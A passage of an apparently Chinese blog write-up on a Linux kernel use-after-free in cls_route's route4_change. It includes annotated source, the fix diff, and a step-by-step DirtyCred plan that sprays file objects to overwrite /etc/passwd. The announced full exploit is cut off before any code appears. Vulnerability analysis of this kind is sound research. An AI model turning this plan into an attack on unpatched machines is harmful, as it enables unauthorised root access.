class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">route4_change</span><span class="params">(struct net *net, struct sk_buff *in_skb,</span></span></span><br><span class="line"><span class="params"><span class="function">			 struct tcf_proto *tp, <span class="keyword">unsigned</span> <span class="keyword">long</span> base, u32 handle,</span></span></span><br><span class="line"><span class="params"><span class="function">			 struct nlattr **tca, <span class="keyword">void</span> **arg, <span class="keyword">bool</span> ovr,</span></span></span><br><span class="line"><span class="params"><span class="function">			 <span class="keyword">bool</span> rtnl_held, struct netlink_ext_ack *extack)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">route4_head</span> *<span class="title">head</span> =</span> rtnl_dereference(tp-&gt;root);</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">route4_filter</span> __<span class="title">rcu</span> **<span class="title">fp</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">route4_filter</span> *<span class="title">fold</span>, *<span class="title">f1</span>, *<span class="title">pfp</span>, *<span class="title">f</span> =</span> <span class="literal">NULL</span>;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">route4_bucket</span> *<span class="title">b</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">nlattr</span> *<span class="title">opt</span> =</span> tca[TCA_OPTIONS];</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">nlattr</span> *<span class="title">tb</span>[<span class="title">TCA_ROUTE4_MAX</span> + 1];</span></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">int</span> h, th;</span><br><span class="line">	<span class="keyword">int</span> err;</span><br><span class="line">	<span class="keyword">bool</span> <span class="keyword">new</span> = <span class="literal">true</span>;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (opt == <span class="literal">NULL</span>)</span><br><span class="line">		<span class="keyword">return</span> handle ? -EINVAL : <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">	err = nla_parse_nested_deprecated(tb, TCA_ROUTE4_MAX, opt,</span><br><span class="line">					  route4_policy, <span class="literal">NULL</span>);</span><br><span class="line">	<span class="keyword">if</span> (err &lt; <span class="number">0</span>)</span><br><span class="line">		<span class="keyword">return</span> err;</span><br><span class="line"></span><br><span class="line">	fold = *arg; <span class="comment">/* 现有的route4_filter对象 */</span></span><br><span class="line">	<span class="keyword">if</span> (fold &amp;&amp; handle &amp;&amp; fold-&gt;handle != handle)</span><br><span class="line">			<span class="keyword">return</span> -EINVAL;</span><br><span class="line"></span><br><span class="line">	err = -ENOBUFS;</span><br><span class="line">	f = kzalloc(<span class="keyword">sizeof</span>(struct route4_filter), GFP_KERNEL); <span class="comment">/* 分配新的route4_filter对象 */</span></span><br><span class="line">	<span class="keyword">if</span> (!f)</span><br><span class="line">		<span class="keyword">goto</span> errout;</span><br><span class="line"></span><br><span class="line">	err = tcf_exts_init(&amp;f-&gt;exts, net, TCA_ROUTE4_ACT, TCA_ROUTE4_POLICE); <span class="comment">/* 进行初始化,为route4_filter-&gt;exts.action分配256字节的空间 */</span></span><br><span class="line">	<span class="keyword">if</span> (err &lt; <span class="number">0</span>)</span><br><span class="line">		<span class="keyword">goto</span> errout;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (fold) &#123; <span class="comment">/* 把旧的route4_filter对象中的数据填入新的route4_filter对象 */</span></span><br><span class="line">		f-&gt;id = fold-&gt;id;</span><br><span class="line">		f-&gt;iif = fold-&gt;iif;</span><br><span class="line">		f-&gt;res = fold-&gt;res;</span><br><span class="line">		f-&gt;handle = fold-&gt;handle;</span><br><span class="line"></span><br><span class="line">		f-&gt;tp = fold-&gt;tp;</span><br><span class="line">		f-&gt;bkt = fold-&gt;bkt;</span><br><span class="line">		<span class="keyword">new</span> = <span class="literal">false</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	err = route4_set_parms(net, tp, base, f, handle, head, tb,</span><br><span class="line">			       tca[TCA_RATE], <span class="keyword">new</span>, ovr, extack); <span class="comment">/* 初始化new filter */</span></span><br><span class="line">	<span class="keyword">if</span> (err &lt; <span class="number">0</span>)</span><br><span class="line">		<span class="keyword">goto</span> errout;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* 将new filter插入到list */</span></span><br><span class="line">	h = from_hash(f-&gt;handle &gt;&gt; <span class="number">16</span>);</span><br><span class="line">	fp = &amp;f-&gt;bkt-&gt;ht[h];</span><br><span class="line">	<span class="keyword">for</span> (pfp = rtnl_dereference(*fp);</span><br><span class="line">         (f1 = rtnl_dereference(*fp)) != <span class="literal">NULL</span>;</span><br><span class="line">         fp = &amp;f1-&gt;next)</span><br><span class="line">		<span class="keyword">if</span> (f-&gt;handle &lt; f1-&gt;handle)</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">	tcf_block_netif_keep_dst(tp-&gt;chain-&gt;block);</span><br><span class="line">	rcu_assign_pointer(f-&gt;next, f1);</span><br><span class="line">	rcu_assign_pointer(*fp, f);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* 若存在old filter,old handle不为&quot;0&quot;,old new handle不同,则从list中移除 */</span></span><br><span class="line">	<span class="keyword">if</span> (fold &amp;&amp; fold-&gt;handle &amp;&amp; f-&gt;handle != fold-&gt;handle) &#123;</span><br><span class="line">		th = to_hash(fold-&gt;handle);</span><br><span class="line">		h = from_hash(fold-&gt;handle &gt;&gt; <span class="number">16</span>);</span><br><span class="line">		b = rtnl_dereference(head-&gt;table[th]);</span><br><span class="line">		<span class="keyword">if</span> (b) &#123;</span><br><span class="line">			fp = &amp;b-&gt;ht[h]; <span class="comment">/* ht存放的是route4_filter列表 */</span></span><br><span class="line">			<span class="keyword">for</span> (pfp = rtnl_dereference(*fp); pfp;</span><br><span class="line">			     fp = &amp;pfp-&gt;next, pfp = rtnl_dereference(*fp)) &#123;</span><br><span class="line">				<span class="keyword">if</span> (pfp == fold) &#123;</span><br><span class="line">					rcu_assign_pointer(*fp, fold-&gt;next); <span class="comment">/* 从链表中删除 */</span></span><br><span class="line">					<span class="keyword">break</span>;</span><br><span class="line">				&#125;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	route4_reset_fastmap(head);</span><br><span class="line">	*arg = f;</span><br><span class="line">	<span class="keyword">if</span> (fold) &#123; <span class="comment">/* 若存在old filter,释放old filter */</span></span><br><span class="line">		tcf_unbind_filter(tp, &amp;fold-&gt;res);</span><br><span class="line">		tcf_exts_get_net(&amp;fold-&gt;exts);</span><br><span class="line">		tcf_queue_work(&amp;fold-&gt;rwork, route4_delete_filter_work); <span class="comment">/* 启动内核任务,调用route4_delete_filter_work释放old filter */</span></span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">errout:</span><br><span class="line">	<span class="keyword">if</span> (f)</span><br><span class="line">		tcf_exts_destroy(&amp;f-&gt;exts);</span><br><span class="line">	kfree(f);</span><br><span class="line">	<span class="keyword">return</span> err;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>使用 <code>handle</code> 作为 ID 来区分不同的 <code>route4_filter</code></li>
<li>如果存在某个 <code>handle</code> 之前已被初始化过（<code>fold</code> 变量非空），就会移除旧的 <code>filter</code>，添加新的 <code>filter</code></li>
<li>否则直接添加新的 <code>filter</code></li>
</ul>
<p>这里可以发现，将 <code>route4_filter</code> 对象从链表中删除和释放时的检查条件不一致：</p>
<ul>
<li>从链表中删除的条件：<ul>
<li>存在 <code>old filter</code></li>
<li><code>old handle</code> 不为 “0”</li>
<li><code>old new handle</code> 不同</li>
</ul>
</li>
<li>从链表中释放的条件：<ul>
<li>存在 <code>old filter</code></li>
</ul>
</li>
</ul>
<p>如果 <code>old handle == 0</code>，则不会在链表中删除但是会被释放，这就导致了一个 UAF</p>
<p>漏洞利用的思路为：</p>
<p><strong>cross-cache</strong>：我们将释放某个 <code>kmalloc-256 cache page</code>，将该页归还给页管理器，然后分配 <code>file</code> 结构来复用该页（<code>filp cache</code>）</p>
<ul>
<li>分配一堆 <code>kmalloc-256</code> 堆块，包含漏洞对象</li>
<li>利用漏洞第1次释放漏洞对象，并释放一堆 <code>kmalloc-256</code>，以归还漏洞对象所在的页</li>
<li>分配大量低权限 <code>file</code> 对象来占据漏洞对象（cross-cache attack）</li>
<li>利用漏洞第2次释放漏洞对象（低权限 <code>file</code> 对象被释放）</li>
<li>堆喷高权限 <code>file</code> 对象来替换低权限 <code>file</code> 对象</li>
<li>利用 UAF 控制高权限 <code>file</code> 对象</li>
</ul>
<p>补丁：</p>
<figure class="highlight diff"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">diff --git a/net/sched/cls_route.c b/net/sched/cls_route.c</span></span><br><span class="line"><span class="comment">index a35ab8c27866e..3f935cbbaff66 100644</span></span><br><span class="line"><span class="comment">--- a/net/sched/cls_route.c</span></span><br><span class="line"><span class="comment">+++ b/net/sched/cls_route.c</span></span><br><span class="line"><span class="meta">@@ -526,7 +526,7 @@</span> static int route4_change(struct net *net, struct sk_buff *in_skb,</span><br><span class="line">    rcu_assign_pointer(f-&gt;next, f1);</span><br><span class="line">    rcu_assign_pointer(*fp, f);</span><br><span class="line"></span><br><span class="line"><span class="deletion">-   if (fold &amp;&amp; fold-&gt;handle &amp;&amp; f-&gt;handle != fold-&gt;handle) &#123;</span></span><br><span class="line"><span class="addition">+   if (fold) &#123;</span></span><br><span class="line">        th = to_hash(fold-&gt;handle);</span><br><span class="line">        h = from_hash(fold-&gt;handle &gt;&gt; 16);</span><br><span class="line">        b = rtnl_dereference(head-&gt;table[th]);</span><br></pre></td></tr></table></figure>
<p><strong>Dirty Cred 漏洞复现</strong></p>
<div class="table-container">
<table>
<thead>
<tr>
<th>进程1</th>
<th>进程2</th>
</tr>
</thead>
<tbody>
<tr>
<td>0. 绑定到 CPU 0 上运行，设置子进程内存、工作目录、Namespace，启动进程2</td>
<td></td>
</tr>
<tr>
<td>1. 去碎片化，打开10000个文件，消耗 filp cache，为 cross-cache 作准备</td>
<td></td>
</tr>
<tr>
<td>2. 喷射 (middle+3)*32 kmalloc-192 &amp; kmalloc-256（和漏洞对象位于同一cache，便于进行 cross-cache 被 file 对象复用）</td>
<td></td>
</tr>
<tr>
<td></td>
<td>3. 分配1个 route4_filter 漏洞对象，还有1个kmalloc-256 的漏洞对象</td>
</tr>
<tr>
<td>4. 再喷射 (end-middle-2)*32 kmalloc-192 &amp; kmalloc-256</td>
<td></td>
</tr>
<tr>
<td>5. 释放 (end-24)*32 kmalloc-192 &amp; kmalloc-256</td>
<td></td>
</tr>
<tr>
<td></td>
<td>6. 第1次释放漏洞对象 kmalloc-192 &amp; kmalloc-256</td>
</tr>
<tr>
<td>7. 释放 (end-middle+1) kmalloc-192 &amp; kmalloc-256（避免连续释放同一对象，触发内核 double-free 的检测）</td>
<td></td>
</tr>
<tr>
<td></td>
<td>8. 喷射 4000 个低权限 file 对象（通过打开 exp_dir/data 文件）</td>
</tr>
<tr>
<td></td>
<td>9. 第2次释放漏洞对象 kmalloc-192 &amp; kmalloc-256</td>
</tr>
<tr>
<td></td>
<td>10. 喷射 5000 个低权限 file 对象，采用 kcmp 调用检查是否和前 4000 个 file 重合，重合的两个 file 记为 overlap_a / overlap_b</td>
</tr>
<tr>
<td></td>
<td>11. 发起3个利用线程，线程1写入大量数据来占用文件锁，线程2往 overlap_a 写入恶意数据</td>
</tr>
<tr>
<td>12. 线程3关闭 overlap_a / overlap_b，喷射 4096*2 个高权限 file 对象（通过打开 /etc/passwd 文件），未区分CPU</td>
<td></td>
</tr>
<tr>
<td></td>
<td>13. 最后检查 /etc/passwd 文件是否被写入恶意数据</td>
</tr>
</tbody>
</table>
</div>
<p>完整 exp 如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br><span class="line">382</span><br><span class="line">383</span><br><span class="line">384</span><br><span class="line">385</span><br><span class="line">386</span><br><span class="line">387</span><br><span class="line">388</span><br><span class="line">389</span><br><span class="line">390</span><br><span class="line">391</span><br><span class="line">392</span><br><span class="line">393</span><br><span class="line">394</span><br><span class="line">395</span><br><span class="line">396</span><br><span class="line">397</span><br><span class="line">398</span><br><span class="line">399</span><br><span class="line">400</span><br><span class="line">401</span><br><span class="line">402</span><br><span class="line">403</span><br><span class="line">404</span><br><span class="line">405</span><br><span class="line">406</span><br><span class="line">407</span><br><span class="line">408</span><br><span class="line">409</span><br><span class="line">410</span><br><span class="line">411</span><br><span class="line">412</span><br><span class="line">413</span><br><span class="line">414</span><br><span class="line">415</span><br><span class="line">416</span><br><span class="line">417</span><br><span class="line">418</span><br><span class="line">419</span><br><span class="line">420</span><br><span class="line">421</span><br><span class="line">422</span><br><span class="line">423</span><br><span class="line">424</span><br><span class="line">425</span><br><span class="line">426</span><br><span class="line">427</span><br><span class="line">428</span><br><span class="line">429</span><br><span class="line">430</span><br><span class="line">431</span><br><span class="line">432</span><br><span class="line">433</span><br><span class="line">434</span><br><span class="line">435</span><br><span class="line">436</span><br><span class="line">437</span><br><span class="line">438</span><br><span class="line">439</span><br><span class="line">440</span><br><span class="line">441</span><br><span class="line">442</span><br><span class="line">443</span><br><span class="line">444</span><br><span class="line">445</span><br><span class="line">446</span><br><span class="line">447</span><br><span class="line">448</span><br><span class="line">449</span><br><span class="line">450</span><br><span class="line">451</span><br><span class="line">452</span><br><span class="line">453</span><br><span class="line">454</span><br><span class="line">455</span><br><span class="line">456</span><br><span class="line">457</span><br><span class="line">458</span><br><span class="line">459</span><br><span class="line">460</span><br><span class="line">461</span><br><span class="line">462</span><br><span class="line">463</span><br><span class="line">464</span><br><span class="line">465</span><br><span class="line">466</span><br><span class="line">467</span><br><span class="line">468</span><br><span class="line">469</span><br><span class="line">470</span><br><span class="line">471</span><br><span class="line">472</span><br><span class="line">473</span><br><span class="line">474</span><br><span class="line">475</span><br><span class="line">476</span><br><span class="line">477</span><br><span class="line">478</span><br><span class="line">479</span><br><span class="line">480</span><br><span class="line">481</span><br><span class="line">482</span><br><span class="line">483</span><br><span class="line">484</span><br><span class="line">485</span><br><span class="line">486</span><br><span class="line">487</span><br><span class="line">488</span><br><span class="line">489</span><br><span class="line">490</span><br><span class="line">491</span><br><span class="line">492</span><br><span class="line">493</span><br><span class="line">494</span><br><span class="line">495</span><br><span class="line">496</span><br><span class="line">497</span><br><span class="line">498</span><br><span class="line">499</span><br><span class="line">500</span><br><span class="line">501</span><br><span class="line">502</span><br><span class="line">503</span><br><span class="line">504</span><br><span class="line">505</span><br><span class="line">506</span><br><span class="line">507</span><br><span class="line">508</span><br><span class="line">509</span><br><span class="line">510</span><br><span class="line">511</span><br><span class="line">512</span><br><span class="line">513</span><br><span class="line">514</span><br><span class="line">515</span><br><span class="line">516</span><br><span class="line">517</span><br><span class="line">518</span><br><span class="line">519</span><br><span class="line">520</span><br><span class="line">521</span><br><span class="line">522</span><br><span class="line">523</span><br><span class="line">524</span><br><span class="line">525</span><br><span class="line">526</span><br><span class="line">527</span><br><span class="line">528</span><br><span class="line">529</span><br><span class="line">530</span><br><span class="line">531</span><br><span class="line">532</span><br><span class="line">533</span><br><span class="line">534</span><br><span class="line">535</span><br><span class="line">536</span><br><span class="line">537</span><br><span class="line">538</span><br><span class="line">539</span><br><span class="line">540</span><br><span class="line">541</span><br><span class="line">542</span><br><span class="line">543</span><br><span class="line">544</span><br><span class="line">545</span><br><span class="line">546</span><br><span class="line">547</span><br><span class="line">548</span><br><span class="line">549</span><br><span class="line">550</span><br><span class="line">551</span><br><span class="line">552</span><br><span class="line">553</span><br><span class="line">554</span><br><span class="line">555</span><br><span class="line">556</span><br><span class="line">557</span><br><span class="line">558</span><br><span class="line">559</span><br><span class="line">560</span><br><span class="line">561</span><br><span class="line">562</span><br><span class="line">563</span><br><span class="line">564</span><br><span class="line">565</span><br><span class="line">566</span><br><span class="line">567</span><br><span class="line">568</span><br><span class="line">569</span><br><span class="line">570</span><br><span class="line">571</span><br><span class="line">572</span><br><span class="line">573</span><br><span class="line">574</span><br><span class="line">575</span><br><span class="line">576</span><br><span class="line">577</span><br><span class="line">578</span><br><span class="line">579</span><br><span class="line">580</span><br><span class="line">581</span><br><span class="line">582</span><br><span class="line">583</span><br><span class="line">584</span><br><span class="line">585</span><br><span class="line">586</span><br><span class="line">587</span><br><span class="line">588</span><br><span class="line">589</span><br><span class="line">590</span><br><span class="line">591</span><br><span class="line">592</span><br><span class="line">593</span><br><span class="line">594</span><br><span class="line">595</span><br><span class="line">596</span><br><span class="line">597</span><br><span class="line">598</span><br><span class="line">599</span><br><span class="line">600</span><br><span class="line">601</span><br><span class="line">602</span><br><span class="line">603</span><br><span class="line">604</span><br><span class="line">605</span><br><span class="line">606</span><br><span class="line">607</span><br><span class="line">608</span><br><span class="line">609</span><br><span class="line">610</span><br><span class="line">611</span><br><span class="line">612</span><br><span class="line">613</span><br><span class="line">614</span><br><span class="line">615</span><br><span class="line">616</span><br><span class="line">617</span><br><span class="line">618</span><br><span class="line">619</span><br><span class="line">620</span><br><span class="line">621</span><br><span class="line">622</span><br><span class="line">623</span><br><span class="line">624</span><br><span class="line">625</span><br><span class="line">626</span><br><span class="line">627</span><br><span class="line">628</span><br><span class="line">629</span><br><span class="line">630</span><br><span class="line">631</span><br><span class="line">632</span><br><span class="line">633</span><br><span class="line">634</span><br><span class="line">635</span><br><span class="line">636</span><br><span class="line">637</span><br><span class="line">638</span><br><span class="line">639</span><br><span class="line">640</span><br><span class="line">641</span><br><span class="line">642</span><br><span class="line">643</span><br><span class="line">644</span><br><span class="line">645</span><br><span class="line">646</span><br><span class="line">647</span><br><span class="line">648</span><br><span class="line">649</span><br><span class="line">650</span><br><span class="line">651</span><br><span class="line">652</span><br><span class="line">653</span><br><span class="line">654</span><br><span class="line">655</span><br><span class="line">656</span><br><span class="line">657</span><br><span class="line">658</span><br><span class="line">659</span><br><span class="line">660</span><br><span class="line">661</span><br><span class="line">662</span><br><span class="line">663</span><br><span class="line">664</span><br><span class="line">665</span><br><span class="line">666</span><br><span class="line">667</span><br><span class="line">668</span><br><span class="line">669</span><br><span class="line">670</span><br><span class="line">671</span><br><span class="line">672</span><br><span class="line">673</span><br><span class="line">674</span><br><span class="line">675</span><br><span class="line">676</span><br><span class="line">677</span><br><span class="line">678</span><br><span class="line">679</span><br><span class="line">680</span><br><span class="line">681</span><br><span class="line">682</span><br><span class="line">683</span><br><span class="line">684</span><br><span class="line">685</span><br><span class="line">686</span><br><span class="line">687</span><br><span class="line">688</span><br><span class="line">689</span><br><span class="line">690</span><br><span class="line">691</span><br><span class="line">692</span><br><span class="line">693</span><br><span class="line">694</span><br><span class="line">695</span><br><span class="line">696</span><br><span class="line">697</span><br><span class="line">698</span><br><span class="line">699</span><br><span class="line">700</span><br><span class="line">701</span><br><span class="line">702</span><br><span class="line">703</span><br><span class="line">704</span><br><span class="line">705</span><br><span class="line">706</span><br><span class="line">707</span><br><span class="line">708</span><br><span class="line">709</span><br><span class="line">710</span><br><span class="line">711</span><br><span class="line">712</span><br><span class="line">713</span><br><span class="line">714</span><br><span class="line">715</span><br><span class="line">716</span><br><span class="line">717</span><br><span class="line">718</span><br><span class="line">719</span><br><span class="line">720</span><br><span class="line">721</span><br><span class="line">722</span><br><span class="line">723</span><br><span class="line">724</span><br><span class="line">725</span><br><span class="line">726</span><br><span class="line">727</span><br><span class="line">728</span><br><span class="line">729</span><br><span class="line">730</span><br><span class="line">731</span><br><span class="line">732</span><br><span class="line">733</span><br><span class="line">734</span><br><span class="line">735</span><br><span class="line">736</span><br><span class="line">737</span><br><span class="line">738</span><br><span class="line">739</span><br><span class="line">740</span><br><span class="line">741</span><br><span class="line">742</span><br><span class="line">743</span><br><span class="line">744</span><br><span class="line">745</span><br><span class="line">746</span><br><span class="line">747</span><br><span class="line">748</span><br><span class="line">749</span><br><span class="line">750</span><br><span class="line">751</span><br><span class="line">752</span><br><span class="line">753</span><br><span class="line">754</span><br><span class="line">755</span><br><span class="line">756</span><br><span class="line">757</span><br><span class="line">758</span><br><span 